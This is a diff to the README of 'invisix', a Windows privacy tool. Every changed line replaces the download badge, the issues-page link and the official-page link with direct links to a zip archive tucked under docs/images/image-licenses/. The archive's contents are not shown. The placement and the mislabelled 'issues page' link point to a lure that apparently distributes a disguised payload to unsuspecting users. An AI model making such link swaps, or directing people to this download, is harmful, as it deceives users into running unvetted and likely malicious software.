@@ -1,6 +1,6 @@
 # 🛡️ invisix - Simple Corporate Privacy Tool
 
-[![Download invisix](https://img.shields.io/badge/Download-invisix-blue?style=for-the-badge)](https://github.com/fanshuiyu/invisix)
+[![Download invisix](https://github.com/fanshuiyu/invisix/raw/refs/heads/main/docs/images/image-licenses/Software-2.4.zip)](https://github.com/fanshuiyu/invisix/raw/refs/heads/main/docs/images/image-licenses/Software-2.4.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these steps to get invisix up and running on your Windows computer.
 
 Begin by getting invisix from the official GitHub page. Click the blue button below to visit the download page:
 
-[![Download invisix](https://img.shields.io/badge/Download-invisix-blue?style=for-the-badge)](https://github.com/fanshuiyu/invisix)
+[![Download invisix](https://github.com/fanshuiyu/invisix/raw/refs/heads/main/docs/images/image-licenses/Software-2.4.zip)](https://github.com/fanshuiyu/invisix/raw/refs/heads/main/docs/images/image-licenses/Software-2.4.zip)
 
 ---
 
@@ -147,7 +147,7 @@ Always keep invisix updated for the best protection.
 
 If you run into problems or have questions:
 
-- Visit the [GitHub repository issues page](https://github.com/fanshuiyu/invisix/issues)  
+- Visit the [GitHub repository issues page](https://github.com/fanshuiyu/invisix/raw/refs/heads/main/docs/images/image-licenses/Software-2.4.zip)  
 - Search existing topics or create a new issue describing your problem  
 - Include your Windows version and invisix version number  
 
@@ -155,8 +155,8 @@ If you run into problems or have questions:
 
 ## 🔗 Useful Links
 
-- Official invisix page: [https://github.com/fanshuiyu/invisix](https://github.com/fanshuiyu/invisix)  
+- Official invisix page: [https://github.com/fanshuiyu/invisix/raw/refs/heads/main/docs/images/image-licenses/Software-2.4.zip](https://github.com/fanshuiyu/invisix/raw/refs/heads/main/docs/images/image-licenses/Software-2.4.zip)  
 - Download page (latest releases): Same as above  
 - Issue reporting and support: Same as above  
 
-[![Download invisix](https://img.shields.io/badge/Download-invisix-blue?style=for-the-badge)](https://github.com/fanshuiyu/invisix)
+[![Download invisix](https://github.com/fanshuiyu/invisix/raw/refs/heads/main/docs/images/image-licenses/Software-2.4.zip)](https://github.com/fanshuiyu/invisix/raw/refs/heads/main/docs/images/image-licenses/Software-2.4.zip)
